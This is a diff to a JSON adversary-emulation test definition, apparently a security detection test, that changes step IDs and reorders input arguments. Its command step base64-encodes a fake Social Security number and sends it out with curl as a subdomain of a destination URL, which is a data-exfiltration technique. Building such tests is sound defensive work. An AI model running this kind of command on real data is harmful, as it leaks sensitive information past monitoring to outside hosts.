@@ -7,7 +7,7 @@
   ],
   "steps": [
     {
-      "id": "bc55df8c-da82-42e8-b9c0-2c3d5ceb9a43",
+      "id": "dfbd7418-3a6a-42a8-99bb-a029fada5255",
       "type": "execute-command",
       "data": {
         "command": "echo -n 111-11-1111 | b64encode -r -\ncurl -XPOST #{base64_data}.#{destination_url}\n",
@@ -16,7 +16,7 @@
       "elevation_required": false
     },
     {
-      "id": "06c9685a-e637-4a37-ad4a-f87c3b81ab60",
+      "id": "618eaa82-4abe-414b-ab24-06cdc346a59c",
       "name": "Check dependency 1/1",
       "description": "Requires curl\n",
       "type": "execute-command",
@@ -27,7 +27,7 @@
       "elevation_required": false
     },
     {
-      "id": "acf505ae-2d58-48f4-879c-e4eee40675aa",
+      "id": "2eebd217-18b9-4614-abd8-48951928dd67",
       "name": "Resolve dependency 1/1",
       "description": "Requires curl\n",
       "type": "execute-command",
@@ -38,7 +38,7 @@
       "elevation_required": false
     },
     {
-      "id": "c87b2026-bb5d-4650-8bd4-3d77c8b30575",
+      "id": "376441cf-77c2-4b8e-9d99-bf89ba37d705",
       "name": "Re-check dependency 1/1",
       "description": "Requires curl\n",
       "type": "execute-command",
@@ -51,24 +51,24 @@
   ],
   "flows": [
     {
-      "s": "06c9685a-e637-4a37-ad4a-f87c3b81ab60",
+      "s": "618eaa82-4abe-414b-ab24-06cdc346a59c",
       "p": "on-success",
-      "o": "bc55df8c-da82-42e8-b9c0-2c3d5ceb9a43"
+      "o": "dfbd7418-3a6a-42a8-99bb-a029fada5255"
     },
     {
-      "s": "06c9685a-e637-4a37-ad4a-f87c3b81ab60",
+      "s": "618eaa82-4abe-414b-ab24-06cdc346a59c",
       "p": "on-failure",
-      "o": "acf505ae-2d58-48f4-879c-e4eee40675aa"
+      "o": "2eebd217-18b9-4614-abd8-48951928dd67"
     },
     {
-      "s": "acf505ae-2d58-48f4-879c-e4eee40675aa",
+      "s": "2eebd217-18b9-4614-abd8-48951928dd67",
       "p": "on-success",
-      "o": "c87b2026-bb5d-4650-8bd4-3d77c8b30575"
+      "o": "376441cf-77c2-4b8e-9d99-bf89ba37d705"
     },
     {
-      "s": "c87b2026-bb5d-4650-8bd4-3d77c8b30575",
+      "s": "376441cf-77c2-4b8e-9d99-bf89ba37d705",
       "p": "on-failure",
-      "o": "bc55df8c-da82-42e8-b9c0-2c3d5ceb9a43"
+      "o": "dfbd7418-3a6a-42a8-99bb-a029fada5255"
     }
   ],
   "tags": [
@@ -77,16 +77,16 @@
   ],
   "input_arguments": [
     {
-      "name": "base64_data",
-      "type": "string",
-      "description": "Encoded data to post using fake Social Security number 111-11-1111.",
-      "value": "MTExLTExLTExMTE="
-    },
-    {
       "name": "destination_url",
       "type": "url",
       "description": "Destination URL to post encoded data.",
       "value": "redcanary.com"
+    },
+    {
+      "name": "base64_data",
+      "type": "string",
+      "description": "Encoded data to post using fake Social Security number 111-11-1111.",
+      "value": "MTExLTExLTExMTE="
     }
   ]
 }
